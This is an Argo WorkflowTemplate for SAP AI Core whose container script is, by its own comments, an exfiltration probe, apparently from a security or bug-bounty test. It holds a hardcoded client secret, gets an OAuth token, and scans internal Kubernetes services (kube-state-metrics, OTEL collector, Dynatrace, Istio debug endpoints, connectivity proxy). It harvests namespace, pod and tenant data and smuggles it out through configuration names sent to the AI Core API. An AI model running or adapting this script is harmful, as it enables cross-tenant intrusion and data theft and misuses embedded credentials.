apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "46.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V46: Exfiltrate OTEL/KSM data via AI Core API (since callbacks are blocked)
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        # Get token
        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
        echo "JWT: ${#JWT} chars" >&2

        # Helper: save data as config name (max 256 chars, alphanum+dash)
        save_result() {
          local tag="$1"
          local data="$2"
          # Sanitize: replace non-alphanum with dash, truncate
          local safe=$(echo "$data" | tr -c 'a-zA-Z0-9._-' '-' | head -c 200)
          local name="v46-${tag}-${safe}"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" \
            -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null | head -c 50
          echo " [saved: $tag]" >&2
        }

        # 1. KSM DNS resolution
        echo "=== KSM ===" >&2
        for svc in ksm-pods-kube-state-metrics ksm-custom-kube-state-metrics ksm-multi-kube-state-metrics; do
          ip=$(dig +short "${svc}.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
          if [ -n "$ip" ]; then
            save_result "ksm-ip-${svc}" "$ip"
            # Try metrics endpoint
            R=$(curl -sk --connect-timeout 5 "http://${ip}:8080/metrics" 2>&1 | head -c 200)
            save_result "ksm-8080-${svc}" "$R"
            # Try 8443
            R=$(curl -sk --connect-timeout 3 "http://${ip}:8443/metrics" 2>&1 | head -c 200)
            save_result "ksm-8443-${svc}" "$R"
          else
            save_result "ksm-dns-${svc}" "NXDOMAIN"
          fi
        done

        # 2. OTEL metrics - read and extract namespace/tenant data
        echo "=== OTEL ===" >&2
        OTEL_IP=$(dig +short "otel-collector.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
        save_result "otel-ip" "${OTEL_IP:-NXDOMAIN}"

        if [ -n "$OTEL_IP" ]; then
          # Read metrics from port 8888
          METRICS=$(curl -sk --connect-timeout 10 "http://${OTEL_IP}:8888/metrics" 2>&1)
          MSIZE=$(echo "$METRICS" | wc -c | tr -d ' ')
          save_result "otel-size" "${MSIZE}bytes"

          # Extract namespace references (cross-tenant gold)
          NS=$(echo "$METRICS" | grep -oi 'namespace="[^"]*"' | sort -u | head -20 | tr '\n' '|')
          save_result "otel-ns" "$NS"

          # Extract k8s pod names
          PODS=$(echo "$METRICS" | grep -oi 'pod="[^"]*"' | sort -u | head -10 | tr '\n' '|')
          save_result "otel-pods" "$PODS"

          # Extract any rg- prefixed values (resource groups = tenants)
          RGS=$(echo "$METRICS" | grep -o 'rg-[a-f0-9-]*' | sort -u | head -10 | tr '\n' '|')
          save_result "otel-rgs" "$RGS"

          # Extract service names
          SVCS=$(echo "$METRICS" | grep -oi 'service="[^"]*"' | sort -u | head -10 | tr '\n' '|')
          save_result "otel-svcs" "$SVCS"

          # Metric names
          HELPS=$(echo "$METRICS" | grep '^# HELP' | head -10 | cut -d' ' -f3 | tr '\n' '|')
          save_result "otel-metrics" "$HELPS"

          # Port 13133 health
          HEALTH=$(curl -sk --connect-timeout 3 "http://${OTEL_IP}:13133/" 2>&1 | head -c 200)
          save_result "otel-health" "$HEALTH"

          # Port 4318 OTLP trace injection test
          INJECT=$(curl -sk --connect-timeout 3 -X POST "http://${OTEL_IP}:4318/v1/traces" \
            -H "Content-Type: application/json" \
            -d '{"resourceSpans":[{"resource":{"attributes":[{"key":"service.name","value":{"stringValue":"bb14-test"}}]},"scopeSpans":[{"spans":[{"traceId":"00000000000000000000000000000001","spanId":"0000000000000001","name":"test","startTimeUnixNano":"1000000000","endTimeUnixNano":"2000000000"}]}]}]}' 2>&1 | head -c 200)
          save_result "otel-inject" "$INJECT"
        fi

        # 3. Dynatrace ActiveGate
        echo "=== DYNATRACE ===" >&2
        DYN_IP=$(dig +short "dynakube-activegate.dynatrace.svc.cluster.local" 2>/dev/null | head -1)
        save_result "dyna-ip" "${DYN_IP:-NXDOMAIN}"
        if [ -n "$DYN_IP" ]; then
          for port in 9999 443; do
            R=$(curl -sk --connect-timeout 3 "https://${DYN_IP}:${port}/" 2>&1 | head -c 150)
            save_result "dyna-${port}" "$R"
          done
        fi

        # 4. Connectivity proxy with various approaches
        echo "=== CONN PROXY ===" >&2
        CP_IP=$(dig +short "connectivity-proxy.connectivity-proxy.svc.cluster.local" 2>/dev/null | head -1)
        save_result "cp-ip" "${CP_IP:-NXDOMAIN}"
        # Try using it as HTTP proxy
        R=$(curl -sk --connect-timeout 5 -x "http://${CP_IP}:20003" "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | head -c 200)
        save_result "cp-proxy-ksm" "$R"

        # 5. Istio debug endpoints
        echo "=== ISTIO ===" >&2
        ISTIOD=$(dig +short "istiod.istio-system.svc.cluster.local" 2>/dev/null | head -1)
        save_result "istio-ip" "${ISTIOD:-NXDOMAIN}"
        if [ -n "$ISTIOD" ]; then
          R=$(curl -sk --connect-timeout 3 "http://${ISTIOD}:15014/debug/endpointz" 2>&1 | head -c 200)
          save_result "istio-endpoints" "$R"
          R=$(curl -sk --connect-timeout 3 "http://${ISTIOD}:8080/debug/configz" 2>&1 | head -c 200)
          save_result "istio-config" "$R"
        fi

        # 6. Try Feb-era OTEL IPs directly (may have changed)
        echo "=== FEB IPS ===" >&2
        for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
          R=$(curl -sk --connect-timeout 3 "http://${ip}:8888/metrics" 2>&1 | head -c 150)
          if echo "$R" | grep -q "HELP\|TYPE\|otel"; then
            save_result "feb-${ip}" "ALIVE-METRICS"
            # Get namespace data from this collector
            NS=$(curl -sk --connect-timeout 5 "http://${ip}:8888/metrics" 2>&1 | grep -oi 'namespace="[^"]*"' | sort -u | head -10 | tr '\n' '|')
            save_result "feb-ns-${ip}" "$NS"
          else
            save_result "feb-${ip}" "DOWN-or-$(echo $R | head -c 50)"
          fi
        done

        echo "V46 DONE" >&2
